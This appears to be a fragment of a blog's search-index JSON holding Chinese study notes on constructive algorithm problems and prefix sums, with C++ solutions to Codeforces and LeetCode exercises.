从l到r是全为0的区间，每次取堆顶再判断是否要插入被分割的区间即可 typedef pair\u003cint ,int \u003e P; int n; struct cmp{ bool operator()(const P p1, const P p2) { if(p1.second-p1.first == p2.second-p2.first) return p1.first \u003e p2.first; return p1.second-p1.first \u003c p2.second-p2.first; } }; void solve(){ cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++) a[i] = 0; priority_queue\u003cpair\u003cint, int\u003e, vector\u003cpair\u003cint,int\u003e\u003e, cmp\u003e que; int pl = 1, pr = n; int mid = (pl + pr) \u003e\u003e 1; a[mid] = 1; if(1 \u003c mid) que.push({1, mid - 1}); if(mid \u003c n) que.push({mid + 1, n}); int idx = 2; while(que.size()){ auto tmp = que.top(); que.pop(); int l = tmp.first, r = tmp.second; int mid = (l + r) \u003e\u003e 1; a[mid] = idx++; if(l \u003c mid) que.push({l, mid - 1}); if(mid \u003c r) que.push({mid + 1, r}); } for(int i = 1; i \u003c= n; i++) cout \u003c\u003c a[i] \u003c\u003c ' '; cout \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1497C2 构造 数学 从特殊到一般\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r给出n和k， (3≤n≤109, 3≤k≤n).构造数组满足 数组长度为k 数组的元素和等于n lcm(x1, …., xk) \u003c= n/2 ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r先考虑特殊情况，当k等于3的时候，若n为奇数时，输出1、(n-1)/2、(n-1)/2一定满足条件 若n为偶数时，让一位先等于2,有[2,0,0]，若(n-2)/2仍为偶数，则可以，若为奇数则不行,即当n为偶数且(n - 2)是4的倍数即n%4==2时输出[2, (n - 2)/2, (n - 2)/2]; 此时奇数为n%4==1和n%4==3的情况，还剩下n%4 == 0的情况。当n是4的倍数时，将n分为1、1、2即可输出[n / 4, n / 4, n / 2] 再考虑普通情况,已知当k=3时一定有固定解，所以只需要把剩下的k - 3个位置全置为1即可，再将(n - k + 3)分给最后三个位置 void print(ll n){ ll d = n / 4; if(n % 4 == 0){ cout \u003c\u003c d \u003c\u003c ' ' \u003c\u003c d \u003c\u003c ' ' \u003c\u003c d * 2 \u003c\u003c '\\n'; }else if(n % 4 == 1){ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c '\\n'; }else if(n % 4 == 2){ cout \u003c\u003c 2 \u003c\u003c ' ' \u003c\u003c (n - 2) / 2 \u003c\u003c ' ' \u003c\u003c (n - 2) / 2 \u003c\u003c '\\n'; }else{ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c '\\n'; } } void solve(){ ll n, k; cin \u003e\u003e n \u003e\u003e k; if(k == 3){ print(n); }else{ for(int i = 1; i \u003c= k - 3; i++) cout \u003c\u003c 1 \u003c\u003c ' '; n -= k - 3; print(n); } }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"前缀和\r给出一个数列： 1 2 3 4 5 6 7 8 9 它的前缀和： 1 3 6 10 15 21 28 36 45前缀和即：从第一个元素到该元素之和 通常我们会在数组中触及到这类知识。 假设给出原数组 a[5] = {1,2,3,4,5}，我们可以得到前缀和数组，假设为S[5] = {1,3,6,10,15}。 那么可以得到： S[n] = S[n-1] + a[n]，即求前缀和的公式。 ","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:0:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"那么前缀和数组有什么用呢？\r以下给出一道经典前缀和问题： 首先我们先从朴素思想开始考虑，求m次区间和的时间复杂度是O(mn^2^) while(m--)\r{\rint l , r;\rcin \u003e\u003e l \u003e\u003e r;\rint sum = 0;\rfor(int i = l; i \u003c= r; i++)\r{\rsum += num[i];(假设下标从1开始）\r}\rcout \u003c\u003c sum \u003c\u003c endl;\r}我们会发现，我们没求一次区间和，就要循环一次，那么有没有一种方法可以让O(n)的求和变为O(1)的时间复杂度呢？ 答案就是使用前缀和。对区间[l,r]，通过对求前缀和过程的分析可以的出，区间和为s[r]-s[l-1]。因此我们可以通过一次运算求出原数组任意一段数据的和。 以下为代码： #include\u003ciostream\u003e\r#define N 100010\rusing namespace std;\rint nums[N];\rint s[N];\rint main()\r{\rint n,m;\rcin \u003e\u003e n \u003e\u003e m;\rfor(int i = 0; i \u003c n; i++)\r{ cin \u003e\u003e nums[i+1];\rs[i+1] = s[i] + nums[i+1];//求前缀和\r}\rwhile(m--)\r{\rint l,r;\rcin \u003e\u003e l \u003e\u003e r;\rcout \u003c\u003c s[r]-s[l-1] \u003c\u003c endl;//\r}\rreturn 0;\r}","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:1:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"题目\r","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"前缀和结合哈希表\rhttps://leetcode.cn/problems/subarray-sum-equals-k/ 在数组中：\r1.子数组\r子数组的定义：一个或连续多个数组中的元素组成一个子数组(子数组最少包含一个元素)\r2.子序列\r子序列的定义：子序列就是在原来序列中找出一部分组成的序列（子序列不一定连续）如果使用for嵌套循环暴力枚举O(n^2^)的方法必然会超时。 那么分析题意，可知求区间和为k的区间个数,即 s[i] - s[j] == k 同样，如果对前缀和数组进行枚举同样是O(n^2^)的时间复杂度,会超时。 我们用哈希表存储前缀和数组，结合公式s[i] - s[j] == k的变形s[j] = s[i] - k就可以实现O(n)的时间复杂度的解法。 即：对每一个前缀和数组元素s[i],利用哈希表查找s[i] - k是否存在，存在则找到了一个或n个符合题意的区间。 以下为代码 class Solution {\rpublic:\rint subarraySum(vector\u003cint\u003e\u0026 nums, int k) {\runordered_map\u003cint, int\u003e mp;\rmp[0] = 1;\rint sum = 0;\rint ans = 0;\rfor(int i = 0; i \u003c nums.size(); i++)\r{\rsum += nums[i];\rif(mp.find(sum - k) != mp.end())//\rans += mp[sum - k];\rmp[sum]++;\r}\rreturn ans;\r}\r};","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:1","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"前缀乘积\r","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:2","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"https://leetcode.cn/problems/subarray-sum-equals-k/\r最先想到的是遍历求乘积，也就是O(n^2^)的暴力算法，但这不符合题目的要求。 那么我们需要对算法进行优化，从朴素思想出发，遍历求乘积时，从0到n-1累乘，中间跳过i，那么天然地由i分为左右两个区间，根据乘法的结合律，得出answer[i] = i左侧元素的乘积*i右侧元素的乘积。 那么我们只需要提前将每一个i左侧、右侧元素的乘积算出来，就可以实现O(n)时间复杂度的算法。 class Solution {\rpublic:\rvector\u003cint\u003e productExceptSelf(vector\u003cint\u003e\u0026 nums) {\rint n = nums.size();\rvector\u003cint\u003e answer(n);\rvector\u003cint\u003e l(n);\rvector\u003cint\u003e r(n);\rl[0] = 1;\rr[n - 1] = 1;\rfor(int i = 1; i \u003c n; i++)\rl[i] = l[i-1]*nums[i-1];\rfor(int i = n - 2; i \u003e= 0; i--)\rr[i] = r[i+1]*nums[i+1];\rfor(int i = 0; i \u003c n; i++)\ranswer[i] = l[i]*r[i];\rreturn answer;\r}\r};","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:3","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"}]